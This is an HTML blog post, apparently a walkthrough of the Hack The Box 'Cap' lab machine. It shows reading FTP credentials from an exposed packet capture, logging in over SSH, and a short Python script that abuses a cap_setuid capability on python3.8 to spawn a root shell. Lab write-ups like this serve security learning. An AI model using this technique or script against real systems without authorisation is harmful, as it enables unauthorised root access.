@@ -1,0 +1,164 @@
+<!doctype html><html lang=en><head><title>Cap (Easy) Writeup · johndoe</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="John Doe"><meta name=description content="This is a basic write up for the 'CAP' machine on HTB"><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Cap (Easy) Writeup"><meta name=twitter:description content="This is a basic write up for the 'CAP' machine on HTB"><meta property="og:url" content="http://www.example.com/posts/cap-htb/"><meta property="og:site_name" content="johndoe"><meta property="og:title" content="Cap (Easy) Writeup"><meta property="og:description" content="This is a basic write up for the 'CAP' machine on HTB"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-15T04:33:55+08:00"><meta property="article:modified_time" content="2025-11-15T04:33:55+08:00"><meta property="article:tag" content="Wireshark"><meta property="article:tag" content="Binary Capabilities"><link rel=canonical href=http://www.example.com/posts/cap-htb/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.6445a802b9389c9660e1b07b724dcf5718b1065ed2d71b4eeaf981cc7cc5fc46.css integrity="sha256-ZEWoArk4nJZg4bB7ck3PVxixBl7S1xtO6vmBzHzF/EY=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/img/favicon.svg sizes=any><link rel=icon type=image/png href=/img/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/img/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=http://www.example.com/>johndoe
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/about/>About</a></li><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=/projects/>Projects</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=http://www.example.com/posts/cap-htb/>Cap (Easy) Writeup</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
+<time datetime=2025-11-15T04:33:55+08:00>November 15, 2025
+</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
+6-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/wireshark/>Wireshark</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/binary-capabilities/>Binary Capabilities</a></span></div></div></header><div class=post-content><h1 id=introduction>Introduction
+<a class=heading-link href=#introduction><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><blockquote><p>This is a writeup for the HTB machine &ldquo;<a href=https://app.hackthebox.com/machines/Cap class=external-link target=_blank rel=noopener>Cap</a>&rdquo;. It&rsquo;s user rated to be easy and is a great entry level box.</p></blockquote><p>This machine focuses on unrestricted URL directories, unsecure login details, and basic vulnerability enumeration on the target machine. Let&rsquo;s dive into the machine and look at how we could approach it.</p><h1 id=enumeration>Enumeration
+<a class=heading-link href=#enumeration><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><h2 id=initial-recon>Initial Recon
+<a class=heading-link href=#initial-recon><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>To start with, we&rsquo;ll do our basic <strong>nmap</strong> scans of the machine. For something this simple, we don&rsquo;t need to overcomplicate it.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#ff7b72;font-weight:700>[</span>parrot@parrot<span style=color:#ff7b72;font-weight:700>]</span>─<span style=color:#ff7b72;font-weight:700>[</span>~/htb/boxes/Cap<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>└──╼ $ nmap 10.10.10.xxx
+</span></span></code></pre></div><p>Without being too fancy, we can get a quick look at the machine&rsquo;s ports and potential services. After running this, we get an output:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Nmap scan report <span style=color:#ff7b72>for</span> 10.10.10.xxx
+</span></span><span style=display:flex><span>Host is up <span style=color:#ff7b72;font-weight:700>(</span>0.14s latency<span style=color:#ff7b72;font-weight:700>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#a5d6ff>997</span> closed tcp ports <span style=color:#ff7b72;font-weight:700>(</span>conn-refused<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE
+</span></span><span style=display:flex><span>21/tcp open  ftp
+</span></span><span style=display:flex><span>22/tcp open  ssh
+</span></span><span style=display:flex><span>80/tcp open  http
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#ff7b72>done</span>: <span style=color:#a5d6ff>1</span> IP address <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>1</span> host up<span style=color:#ff7b72;font-weight:700>)</span> scanned in 19.10 seconds
+</span></span></code></pre></div><p>Here we can see that the machine is running ftp (basic file serving), ssh (remote connection) and http (basic webserver). Since websites are easy to investigate, lets start there.</p><p>Navigating to the front page, we get this:<figure><img src=/posts/cap-htb/dashboard.png alt="My cool image"></figure></p><p>It seems to be a basic security dashboard. Looking at some of the links, most are dead ends. But the sidebar does lead to some interesting places. Firstly, when we navigate to the Securiy Snapshot page, we end up at</p><blockquote><p>http://10.10.10.245/data/1</p></blockquote><p>I notice that we get a number in the URL here, so let&rsquo;s try and refresh the page and see what happens</p><blockquote><p>http://10.10.10.245/data/2</p></blockquote><p>Interesting&mldr; The URL seems to index the snapshot version which would imply its global, regardless of someones login. Since we started at /1, I wonder if we can get to /0; unsurprisingly, we are able to access a snapshot at /0 and so I&rsquo;ll download it and see what it shows.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#ff7b72;font-weight:700>[</span>parrot@parrot<span style=color:#ff7b72;font-weight:700>]</span>─<span style=color:#ff7b72;font-weight:700>[</span>~/htb/boxes/Cap<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>└──╼ $ cd Artifacts
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>┌─<span style=color:#ff7b72;font-weight:700>[</span>parrot@parrot<span style=color:#ff7b72;font-weight:700>]</span>─<span style=color:#ff7b72;font-weight:700>[</span>~/htb/boxes/Cap/Artifacts<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>└──╼ $ ls
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Security_Snapshot_0.pcap
+</span></span></code></pre></div><p>So now that we downloaded the snapshot, we see that its a pcap or packet capture file, these are common outputs for software like wireshark so lets open it in that.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#ff7b72;font-weight:700>[</span>parrot@parrot<span style=color:#ff7b72;font-weight:700>]</span>─<span style=color:#ff7b72;font-weight:700>[</span>~/htb/boxes/Cap<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>└──╼ $ wireshark Security_Snapshot_0.pcap
+</span></span></code></pre></div><p><img src=wireshark_1.png alt="alt text"></p><p>There&rsquo;s alot of unhelpful traffic here, but what immediately caught my eye was the ftp traffic. Thinking back to the initial nmap scan we saw, ftp was an open service running on the server. Opening the first few packets, we can some basic back and forth for a login to the server, then we get a hit. A login username from one packet, and a password from the next.</p><p><img src=wireshark_2.png alt="alt text">
+<img src=wireshark_3.png alt="alt text"></p><p>So now that we have a login, lets see what we can find in ftp.</p><h2 id=initial-access>Initial Access
+<a class=heading-link href=#initial-access><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#ff7b72;font-weight:700>[</span>parrot@parrot<span style=color:#ff7b72;font-weight:700>]</span>─<span style=color:#ff7b72;font-weight:700>[</span>~/htb/boxes/Cap<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>└──╼ $ ftp 10.10.10.245
+</span></span><span style=display:flex><span>Connected to 10.10.10.xxx.
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>220</span> <span style=color:#ff7b72;font-weight:700>(</span>vsFTPd 3.0.3<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>Name <span style=color:#ff7b72;font-weight:700>(</span>10.10.10.245:parrot<span style=color:#ff7b72;font-weight:700>)</span>: nathan
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>331</span> Please specify the password.
+</span></span><span style=display:flex><span>Password: 
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>230</span> Login successful.
+</span></span><span style=display:flex><span>Remote system type is UNIX.
+</span></span><span style=display:flex><span>Using binary mode to transfer files.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ftp &gt; ls
+</span></span><span style=display:flex><span>drwxr-xr-x    <span style=color:#a5d6ff>3</span> <span style=color:#a5d6ff>1001</span>     <span style=color:#a5d6ff>1001</span>         <span style=color:#a5d6ff>4096</span> Nov <span style=color:#a5d6ff>14</span> 18:05 snap
+</span></span><span style=display:flex><span>-r--------    <span style=color:#a5d6ff>1</span> <span style=color:#a5d6ff>1001</span>     <span style=color:#a5d6ff>1001</span>           <span style=color:#a5d6ff>33</span> Nov <span style=color:#a5d6ff>14</span> 18:04 user.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ftp &gt; pwd
+</span></span><span style=display:flex><span>Remote directory: /home/nathan
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ftp &gt; !cd Artifacts
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ftp&gt; get user.txt
+</span></span><span style=display:flex><span>local: user.txt remote: user.txt
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>229</span> Entering Extended Passive Mode <span style=color:#ff7b72;font-weight:700>(||</span>|50266|<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>150</span> Opening BINARY mode data connection <span style=color:#ff7b72>for</span> user.txt <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>33</span> bytes<span style=color:#ff7b72;font-weight:700>)</span>.
+</span></span><span style=display:flex><span>100% |************************|    <span style=color:#a5d6ff>33</span>      565.37 KiB/s    00:00 ETA
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>226</span> Transfer complete.
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>33</span> bytes received in 00:00 <span style=color:#ff7b72;font-weight:700>(</span>0.21 KiB/s<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span></code></pre></div><p>I did more digging and didn&rsquo;t find much else worth looking into, but we got the user.txt flag so we know we&rsquo;re on the right track.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#ff7b72;font-weight:700>[</span>parrot@parrot<span style=color:#ff7b72;font-weight:700>]</span>─<span style=color:#ff7b72;font-weight:700>[</span>~/htb/boxes/Cap<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>└──╼ $ cat user.txt
+</span></span><span style=display:flex><span>59516xxxxxxxxxxxxxxxxxxxxdf71224
+</span></span></code></pre></div><p>The next thing to try is ssh. We know that both ftp <em>and</em> ssh was active from our <strong>nmap</strong> scan, so lets try the credentials there.</p><h1 id=user-exploitation>User Exploitation
+<a class=heading-link href=#user-exploitation><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><h2 id=lay-of-the-land>Lay of the land
+<a class=heading-link href=#lay-of-the-land><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#ff7b72;font-weight:700>[</span>parrot@parrot<span style=color:#ff7b72;font-weight:700>]</span>─<span style=color:#ff7b72;font-weight:700>[</span>~/htb/boxes/Cap<span style=color:#ff7b72;font-weight:700>]</span>
+</span></span><span style=display:flex><span>└──╼ $ ssh nathan@10.10.10.xxx
+</span></span><span style=display:flex><span>nathan@10.10.10.245<span style=color:#f85149>&#39;</span>s password: 
+</span></span><span style=display:flex><span>Welcome to Ubuntu 20.04.2 LTS <span style=color:#ff7b72;font-weight:700>(</span>GNU/Linux 5.4.0-80-generic x86_64<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System information as of Sat Nov <span style=color:#a5d6ff>15</span> 07:39:40 UTC <span style=color:#a5d6ff>2025</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System load:           0.0
+</span></span><span style=display:flex><span>  Usage of /:            37.4% of 8.73GB
+</span></span><span style=display:flex><span>  Memory usage:          36%
+</span></span><span style=display:flex><span>  Swap usage:            0%
+</span></span><span style=display:flex><span>  Processes:             <span style=color:#a5d6ff>237</span>
+</span></span><span style=display:flex><span>  Users logged in:       <span style=color:#a5d6ff>0</span>
+</span></span><span style=display:flex><span>  IPv4 address <span style=color:#ff7b72>for</span> eth0: 10.10.10.245
+</span></span><span style=display:flex><span>  IPv6 address <span style=color:#ff7b72>for</span> eth0: dead:beef::250:56ff:fe95:f64d
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72;font-weight:700>=</span>&gt; There are <span style=color:#a5d6ff>2</span> zombie processes.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>63</span> updates can be applied immediately.
+</span></span><span style=display:flex><span><span style=color:#a5d6ff>42</span> of these updates are standard security updates.
+</span></span><span style=display:flex><span>To see these additional updates run: apt list --upgradable
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The list of available updates is more than a week old.
+</span></span><span style=display:flex><span>To check <span style=color:#ff7b72>for</span> new updates run: sudo apt update
+</span></span><span style=display:flex><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Fri Nov <span style=color:#a5d6ff>14</span> 18:51:00 <span style=color:#a5d6ff>2025</span> from 10.10.14.70
+</span></span><span style=display:flex><span>nathan@cap:~$ 
+</span></span></code></pre></div><p>Expectantly it works, and we&rsquo;re in the same directory as our ftp shell.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nathan@cap:~$ ls
+</span></span><span style=display:flex><span>snap user.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>nathan@cap:~$ id
+</span></span><span style=display:flex><span><span style=color:#79c0ff>uid</span><span style=color:#ff7b72;font-weight:700>=</span>1001<span style=color:#ff7b72;font-weight:700>(</span>nathan<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>gid</span><span style=color:#ff7b72;font-weight:700>=</span>1001<span style=color:#ff7b72;font-weight:700>(</span>nathan<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>groups</span><span style=color:#ff7b72;font-weight:700>=</span>1001<span style=color:#ff7b72;font-weight:700>(</span>nathan<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>nathan@cap:~$ uname -a
+</span></span><span style=display:flex><span>Linux cap 5.4.0-80-generic 90-Ubuntu SMP Fri Jul <span style=color:#a5d6ff>9</span> 22:49:44 UTC <span style=color:#a5d6ff>2021</span> x86_64 x86_64 x86_64 GNU/Linux
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>nathan@cap:~$ cat /etc/passwd
+</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>nathan:x:1001:1001::/home/nathan:/bin/bash <span style=color:#8b949e;font-style:italic># (no other users have a login shell)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>nathan@cap:~$ ps -ef <span style=color:#8b949e;font-style:italic># Running services</span>
+</span></span><span style=display:flex><span>... <span style=color:#8b949e;font-style:italic># Services of note Python3, lxc/lxd</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>nathan@cap:~$ getcap -r / 2&gt;/dev/null <span style=color:#8b949e;font-style:italic># View binary capabiltiies</span>
+</span></span><span style=display:flex><span>/usr/bin/python3.8 <span style=color:#ff7b72;font-weight:700>=</span> cap_setuid,cap_net_bind_service+eip <span style=color:#8b949e;font-style:italic># !!!!</span>
+</span></span><span style=display:flex><span>/usr/bin/ping <span style=color:#ff7b72;font-weight:700>=</span> cap_net_raw+ep
+</span></span><span style=display:flex><span>/usr/bin/traceroute6.iputils <span style=color:#ff7b72;font-weight:700>=</span> cap_net_raw+ep
+</span></span><span style=display:flex><span>/usr/bin/mtr-packet <span style=color:#ff7b72;font-weight:700>=</span> cap_net_raw+ep
+</span></span><span style=display:flex><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span style=color:#ff7b72;font-weight:700>=</span> cap_net_bind_service,cap_net_admin+ep
+</span></span></code></pre></div><p>This is exactly what we&rsquo;re looking for. The</p><blockquote><p>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</p></blockquote><p>Is very important as it shows our python interpreter has explicit permission to do some dangerous things. Even more so as we control what we can feed to python through scripts.</p><p>The <em>cap_setuid</em> capability means Python (and anything it executes) can <strong>switch to another user</strong>. The <em>cap_net_bind_service</em> capability is dangerous as normally only root can <strong>bind to ports &lt;1024</strong>. Giving this to Python means any Python script can open a service on a privileged port. Combine these with +eip which stand for effective, inheritable and permmitted means there are no guardrails.</p><p>So lets create a script to test, then exploit out machine here.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nathan@cap:~$ vim poc.py
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8b949e;font-style:italic># poc.py</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>import</span> <span style=color:#ff7b72>os</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>try</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#a5d6ff>&#34;[*] Attempting to set UID as root (0)&#34;</span>)
+</span></span><span style=display:flex><span>    os<span style=color:#ff7b72;font-weight:700>.</span>setuid(<span style=color:#a5d6ff>0</span>) <span style=color:#8b949e;font-style:italic># uid (0) indicates root</span>
+</span></span><span style=display:flex><span>    print(<span style=color:#a5d6ff>&#34;[*] Successfuly set to root, now spawning a shell&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>import</span> <span style=color:#ff7b72>pty</span>
+</span></span><span style=display:flex><span>    pty<span style=color:#ff7b72;font-weight:700>.</span>spawn(<span style=color:#a5d6ff>&#34;/bin/bash&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#ff7b72>except</span> <span style=color:#f0883e;font-weight:700>Exception</span> <span style=color:#ff7b72>as</span> e:
+</span></span><span style=display:flex><span>    print(<span style=color:#79c0ff>f</span><span style=color:#a5d6ff>&#34;[*] Failed to set UID: </span><span style=color:#a5d6ff>{</span>e<span style=color:#a5d6ff>}</span><span style=color:#a5d6ff>&#34;</span>)
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nathan@cap:~$ ls 
+</span></span><span style=display:flex><span>snap poc.py user.txt 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>nathan@cap:~<span style=color:#79c0ff>$python3</span> poc.py
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Attempting to set UID as root <span style=color:#ff7b72;font-weight:700>(</span>0<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Successfuly set to root, now spawning a shell
+</span></span><span style=display:flex><span>root@cap:~# whoami
+</span></span><span style=display:flex><span>root
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root@cap:~# id
+</span></span><span style=display:flex><span><span style=color:#79c0ff>uid</span><span style=color:#ff7b72;font-weight:700>=</span>0<span style=color:#ff7b72;font-weight:700>(</span>root<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>gid</span><span style=color:#ff7b72;font-weight:700>=</span>1001<span style=color:#ff7b72;font-weight:700>(</span>nathan<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>groups</span><span style=color:#ff7b72;font-weight:700>=</span>1001<span style=color:#ff7b72;font-weight:700>(</span>nathan<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root@cap:~# cd /root <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> ls
+</span></span><span style=display:flex><span>root.txt  snap
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root@cap:~# cat root.txt
+</span></span><span style=display:flex><span>0eaxxxxxxxxxxxxxxxxxxxxxxxxx4d8d
+</span></span></code></pre></div><p>Congratulations we got root by exploiting unsafe binary capabilities on a python intepreter that allowed us to arbritrarily execute our script as whatever user (including root) that we wanted. This isn&rsquo;t always something exploitable. Some user accessible binaries may have the same capabilities as python did, but if we can&rsquo;t manipulate or provide user input to control the binary like we can with python scripts, it may not be an attack vector.</p><p>TFR.</p></div><footer><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//yourdiscussshortname.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}(),document.addEventListener("themeChanged",function(){document.readyState=="complete"&&DISQUS.reset({reload:!0,config:disqus_config})})</script></footer></article></section></div><footer class=footer><section class=container>©
+2019 -
+2025
+John Doe
+·
+Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
